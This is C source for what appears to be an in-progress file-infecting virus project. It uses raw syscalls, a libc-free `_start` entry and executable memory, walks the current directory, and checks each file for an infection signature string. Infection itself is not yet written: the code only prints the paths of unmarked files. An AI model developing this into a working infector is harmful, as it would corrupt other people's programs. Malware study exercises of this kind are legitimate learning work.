#include "sys/types.h"
#include <stdint.h>
#include <stdio.h>
__attribute__((always_inline)) inline long
sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
    long ret;
    register long r10 __asm__("r10") = arg4;
    register long r8 __asm__("r8") = arg5;
    register long r9 __asm__("r9") = arg6;
    __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(arg1), "S"(arg2), "d"(arg3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    return ret;
}

#include "syscall.h"
#include <dirent.h>
#include <fcntl.h>
#include <stddef.h>
#include <sys/syscall.h>
typedef struct linux_dirent64 {
    uint64_t d_ino;          /* 64-bit inode number */
    uint64_t d_off;          /* Not an offset; see getdents() */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char d_type;    /* File type */
    char d_name[];           /* Filename (null-terminated) */
} dirent64;

inline void
ft_exit(int exit_code) {
    sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
}
inline int
ft_write(int fd, volatile void *ptr, size_t size) {
    return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
}
inline int
ft_read(int fd, volatile void *ptr, size_t size) {
    return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
}

inline int
ft_lseek(int fd, off_t offset, int whence) {
    return sys(SYS_lseek, fd, (long)offset, whence, 0, 0, 0);
}

inline void
ft_print_one() {
    char a = '1';
    char b = '\n';
    ft_write(1, &a, 1);
    ft_write(1, &b, 1);
}
inline void
ft_print_zero() {
    char a = '0';
    char b = '\n';
    ft_write(1, &a, 1);
    ft_write(1, &b, 1);
}

#include <sys/mman.h>
inline uint64_t
ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
}

inline void *
ft_malloc(uint64_t size) {
    return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

inline int
ft_open(char *path, int flags, mode_t mode) {
    return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
}

inline int
ft_getdents64(int fd, char dirp[], size_t count) {
    return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
}

inline int
ft_strlen(volatile char *str) {
    int i = 0;
    while (str[i] != '\0')
        i++;
    return (i);
}

inline int
ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
    const uint64_t NEEDLE_SIZE = ft_strlen(needle);
    int i = 0;
    int j;

    while ((i + NEEDLE_SIZE) < size) {
        j = 0;
        while ((i + j) < (size)) {
            char c = '\n';
            ft_write(100, haystack + i + j, 1);
            ft_write(100, &c, 1);
            ft_write(100, needle + j, 1);
            ft_write(100, &c, 1);
            if (haystack[i + j] != needle[j]) break;
            if (j == (NEEDLE_SIZE - 1)) {
                // j and i are 0 here
                return (1);
            }
            j++;
        }
        i++;
    }
    return (0);
}

inline int
ft_string_search_fd(int fd, volatile char *needle) {
    const uint64_t BUF_SIZE_WITHOUT_OVERLAP = 1000;
    const uint64_t NEEDLE_SIZE = ft_strlen(needle);
    const uint64_t BUF_SIZE = BUF_SIZE_WITHOUT_OVERLAP + NEEDLE_SIZE;

    char buf[BUF_SIZE];

    int bytes_read;
    do {
        bytes_read = ft_read(fd, buf, BUF_SIZE);
        if (bytes_read < 0) return (0);
        if (ft_strstr(buf, needle, bytes_read)) return (1);
        ft_lseek(fd, -NEEDLE_SIZE, SEEK_CUR);
    } while (bytes_read > NEEDLE_SIZE);

    return 0;
}

inline void
signature_fill(volatile char *buf) {
    buf[0] = 'f';
    buf[1] = 'a';
    buf[2] = 'm';
    buf[3] = 'i';
    buf[4] = 'n';
    buf[5] = 'e';
    buf[6] = ' ';
    buf[7] = 'a';
    buf[8] = 'b';
    buf[9] = 'i';
    buf[10] = 'e';
    buf[11] = 'd';
    buf[12] = '-';
    buf[13] = 'c';
    buf[14] = 'h';
    buf[15] = ' ';
    buf[16] = 'f';
    buf[17] = 'b';
    buf[18] = 'r';
    buf[19] = 'u';
    buf[20] = 'g';
    buf[21] = 'g';
    buf[22] = 'e';
    buf[23] = 'm';
    buf[24] = '\0';
}

inline int
infect_file(char *path) {
    int fd = ft_open(path, O_RDWR, 0);
    if (fd < 0) return (1);

    volatile char signature[30];
    signature_fill(signature);

    const uint8_t has_signature = ft_string_search_fd(fd, signature);

    if (has_signature) return (0);

    ft_write(1, path, ft_strlen(path));

    return (0);
}

inline int
infect_dir(char *path) {
    int fd = ft_open(path, O_RDONLY, O_DIRECTORY);

    const uint64_t FILE_NAME_MAX = 255;
    const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
    const uint64_t ALINMENT = 8;
    const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;

    char dirp[DIR_P_SIZE];
    int bytes_read = 0;
    do {
        bytes_read = ft_getdents64(fd, dirp, DIR_P_SIZE);
        if (bytes_read < 0) return (1);

        dirent64 *dirent_cur = (dirent64 *)dirp;
        while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
            if (dirent_cur->d_type == DT_REG) infect_file(dirent_cur->d_name);
            dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
        }
    } while (bytes_read > 0);

    return (0);
}

#ifdef TESTING
int
main(void) {
#else
void
_start() {
#endif /* ifdef TESTING */
    char path[2];
    path[0] = '.';
    path[1] = '\0';

    infect_dir(path);
    ft_exit(0);
}
